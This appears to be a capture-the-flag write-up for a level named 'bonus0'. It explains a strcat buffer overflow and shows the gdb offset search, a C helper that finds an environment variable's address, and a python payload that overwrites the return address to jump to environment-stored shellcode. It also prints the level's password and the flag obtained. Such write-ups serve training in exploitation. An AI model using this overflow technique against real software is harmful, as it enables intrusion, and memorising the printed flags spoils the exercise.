# Bonus 0
```bash
su bonus0 #f3f0004b6f364cb5a4147e9ef827fa922a4861408845c26b6971ad770d906728
```

## Steps
The program receives 2 `read()` of maximum length of `0x1000` bytes. It will later use `strcat` to append both strings. We can exploit this, the 2 buffers are stored next each other. By avoid putting a `\0` at the end of the first buffer, the `strcat` will consider the second string as part of the first one.

We inject `4095` random caracters followed by a `\n` (because there is an unchecked `strchr` using it later). Then we will inject an overflow pattern to find where the RET address is replaced.

```bash
(gdb) r
Starting program: /home/user/bonus0/bonus0
 -
01234567890123456789
 -
Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag
01234567890123456789Aa0Aa1Aa2Aa3Aa4Aa5Aa�� Aa0Aa1Aa2Aa3Aa4Aa5Aa��

Program received signal SIGSEGV, Segmentation fault.
0x41336141 in ?? ()
```

The offset is `9`, we simply have to replace this by the address of our **shellcode**.

```c
// /tmp/getenv.c

#include <stdio.h>
#include <stdlib.h>

int main(int argc, char**argv)
{
    printf("%p\n", getenv(argv[1]));
}
```

```bash
gcc /tmp/getenv.c -o getenv
/tmp/getenv SHELLCODE
```

*We replace this value in the injection*.

```bash
python -c "print '0' *4095 + '\n' + 'Aa0Aa1Aa2' + '\xbf\xff\xf8\xa6'[::-1] + 'a4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag'"> /tmp/b0.

cat /tmp/b0 - | ./bonus0
cd1f77a585965341c37a1774a1d1686326e1fc53aaa5459c840409d4d06523c9
```
